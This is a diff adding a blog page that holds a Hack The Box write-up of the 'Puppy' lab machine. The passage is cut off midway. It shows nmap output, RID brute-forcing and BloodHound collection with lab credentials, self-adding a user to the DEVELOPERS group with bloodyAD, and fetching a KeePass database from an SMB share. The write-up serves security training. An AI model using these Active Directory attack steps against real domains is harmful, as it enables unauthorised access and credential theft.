@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/09/27/hackthebox-puppy/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewPuppy is a medium-difficulty machine from Hack The Box dealing initially with an exposed SMB share where we have to add ourselves to developers group to access it, we’ll later get a kdbx file">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Puppy">
+<meta property="og:url" content="http://fouedsaidi.com/2025/09/27/Hackthebox-Puppy/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewPuppy is a medium-difficulty machine from Hack The Box dealing initially with an exposed SMB share where we have to add ourselves to developers group to access it, we’ll later get a kdbx file">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Puppy/Puppy.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Puppy/blood.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Puppy/priv.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Puppy/priv1.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Puppy/adam.png">
+<meta property="article:published_time" content="2025-09-27T07:09:22.000Z">
+<meta property="article:modified_time" content="2025-09-27T07:51:02.780Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Puppy/Puppy.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Puppy -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Puppy</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-09-27 10:09:22</span>
+        <span class="mobile">2025-09-27 10:09:22</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-09-27 10:51:02</span>
+            <span class="mobile">2025-09-27 10:51:02</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Puppy is a medium-difficulty machine from Hack The Box dealing initially with an exposed SMB share where we have to add ourselves to developers group to access it, we’ll later get a kdbx file that we’ll crack and get some user credentials from it. To later abuse some excessive privileges on adam.siver which later leads us to read DPAPI secrets and get the password of an admin user to own the machine.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Puppy/Puppy.png"
+                      alt="Puppy"
+                ><figcaption>Puppy</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-18 15:00:26Z)</span><br><span class="line">111/tcp  open  rpcbind       2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/tcp6  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp6  rpcbind</span><br><span class="line">|   100003  2,3         2049/udp   nfs</span><br><span class="line">|   100003  2,3         2049/udp6  nfs</span><br><span class="line">|   100005  1,2,3       2049/udp   mountd</span><br><span class="line">|   100005  1,2,3       2049/udp6  mountd</span><br><span class="line">|   100021  1,2,3,4     2049/tcp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/tcp6  nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp6  nlockmgr</span><br><span class="line">|   100024  1           2049/tcp   status</span><br><span class="line">|   100024  1           2049/tcp6  status</span><br><span class="line">|   100024  1           2049/udp   status</span><br><span class="line">|_  100024  1           2049/udp6  status</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">2049/tcp open  nlockmgr      1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">3260/tcp open  iscsi?</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 6h59m04s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-05-18T15:02:35</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have some really interesting ports here. The most important thing is that this box is a domain controller (we can tell so from the 88 kerberos port).</p>
+<h2 id="Domain-enumeration"><a href="#Domain-enumeration" class="headerlink" title="Domain enumeration"></a>Domain enumeration</h2><p>Since we were provided with some credentials, we can use them to get users from their RIDs:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nxc smb 10.10.11.70 -u <span class="string">&#x27;levi.james&#x27;</span> -p <span class="string">&#x27;KingofAkron2025!&#x27;</span> --rid-brute</span><br><span class="line">[*] Initializing NFS protocol database</span><br><span class="line">SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! </span><br><span class="line">SMB         10.10.11.70     445    DC               498: PUPPY\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               500: PUPPY\Administrator (SidTypeUser)</span><br><span class="line">SMB         10.10.11.70     445    DC               501: PUPPY\Guest (SidTypeUser)</span><br><span class="line">SMB         10.10.11.70     445    DC               502: PUPPY\krbtgt (SidTypeUser)</span><br><span class="line">SMB         10.10.11.70     445    DC               512: PUPPY\Domain Admins (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               513: PUPPY\Domain Users (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               514: PUPPY\Domain Guests (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               515: PUPPY\Domain Computers (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               516: PUPPY\Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               517: PUPPY\Cert Publishers (SidTypeAlias)</span><br><span class="line">SMB         10.10.11.70     445    DC               518: PUPPY\Schema Admins (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               519: PUPPY\Enterprise Admins (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               520: PUPPY\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               521: PUPPY\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               522: PUPPY\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               525: PUPPY\Protected Users (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               526: PUPPY\Key Admins (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               527: PUPPY\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               553: PUPPY\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">SMB         10.10.11.70     445    DC               571: PUPPY\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">SMB         10.10.11.70     445    DC               572: PUPPY\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">SMB         10.10.11.70     445    DC               1000: PUPPY\DC$ (SidTypeUser)</span><br><span class="line">SMB         10.10.11.70     445    DC               1101: PUPPY\DnsAdmins (SidTypeAlias)</span><br><span class="line">SMB         10.10.11.70     445    DC               1102: PUPPY\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               1103: PUPPY\levi.james (SidTypeUser)</span><br><span class="line">SMB         10.10.11.70     445    DC               1104: PUPPY\ant.edwards (SidTypeUser)</span><br><span class="line">SMB         10.10.11.70     445    DC               1105: PUPPY\adam.silver (SidTypeUser)</span><br><span class="line">SMB         10.10.11.70     445    DC               1106: PUPPY\jamie.williams (SidTypeUser)</span><br><span class="line">SMB         10.10.11.70     445    DC               1107: PUPPY\steph.cooper (SidTypeUser)</span><br><span class="line">SMB         10.10.11.70     445    DC               1108: PUPPY\HR (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               1109: PUPPY\SENIOR DEVS (SidTypeGroup)</span><br><span class="line">SMB         10.10.11.70     445    DC               1111: PUPPY\steph.cooper_adm (SidTypeUser)</span><br><span class="line">SMB         10.10.11.70     445    DC               1112: PUPPY\Access-Denied Assistance Users (SidTypeAlias)</span><br><span class="line">SMB         10.10.11.70     445    DC               1113: PUPPY\DEVELOPERS (SidTypeGroup)</span><br></pre></td></tr></table></figure></div>
+
+<p>And we can also run bloodhound against the domain:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ bloodhound-python -c All -u levi.james  -p <span class="string">&#x27;KingofAkron2025!&#x27;</span> -d puppy.htb -ns 10.10.11.70 --zip           </span><br><span class="line">INFO: BloodHound.py <span class="keyword">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)</span><br><span class="line">INFO: Found AD domain: puppy.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.puppy.htb:88)] [Errno -2] Name or service not known</span><br><span class="line">INFO: Connecting to LDAP server: dc.puppy.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc.puppy.htb</span><br><span class="line">INFO: Found 10 <span class="built_in">users</span></span><br><span class="line">INFO: Found 56 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 3 gpos</span><br><span class="line">INFO: Found 3 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: DC.PUPPY.HTB</span><br><span class="line">INFO: Done <span class="keyword">in</span> 01M 59S</span><br><span class="line">INFO: Compressing output into 20250518080341_bloodhound.zip</span><br></pre></td></tr></table></figure></div>
+
+<p>Also checking SMB shares, we find an interesting DEV share:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ smbclient -L \\\\10.10.11.70\\ -U levi.james%<span class="string">&#x27;KingofAkron2025!&#x27;</span></span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        DEV             Disk      DEV-SHARE <span class="keyword">for</span> PUPPY-DEVS</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        NETLOGON        Disk      Logon server share </span><br><span class="line">        SYSVOL          Disk      Logon server share </span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 10.10.11.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="SMB-share-access"><a href="#SMB-share-access" class="headerlink" title="SMB share access"></a>SMB share access</h2><p>The DEV share should only be accessible to members of the DEVELOPERS group. We can see a path for it from our own user:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Puppy/blood.png"
+                      alt="BloodHound"
+                ><figcaption>BloodHound</figcaption></figure></p>
+<p>So let’s add levi to the group and get whats inside the share:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ bloodyAD -d puppy.htb -u levi.james -p <span class="string">&#x27;KingofAkron2025!&#x27;</span> --host dc.puppy.htb --dc-ip 10.10.11.70 add groupMember <span class="string">&quot;DEVELOPERS&quot;</span> levi.james</span><br><span class="line">[+] levi.james added to DEVELOPERS</span><br><span class="line">                                                                                                                                                                                </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ smbclient  \\\\dc.puppy.htb\\DEV -U puppy.htb/levi.james</span><br><span class="line">Password <span class="keyword">for</span> [PUPPY.HTB\levi.james]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                  DR        0  Sun Mar 23 07:07:57 2025</span><br><span class="line">  ..                                  D        0  Sat Mar  8 16:52:57 2025</span><br><span class="line">  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 07:09:12 2025</span><br><span class="line">  Projects                            D        0  Sat Mar  8 16:53:36 2025</span><br><span class="line">  recovery.kdbx                       A     2677  Wed Mar 12 02:25:46 2025</span><br><span class="line"></span><br><span class="line">                5080575 blocks of size 4096. 1544684 blocks available</span><br><span class="line">smb: \&gt; get recovery.kdbx</span><br><span class="line">getting file \recovery.kdbx of size 2677 as recovery.kdbx (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)</span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> Projects</span><br><span 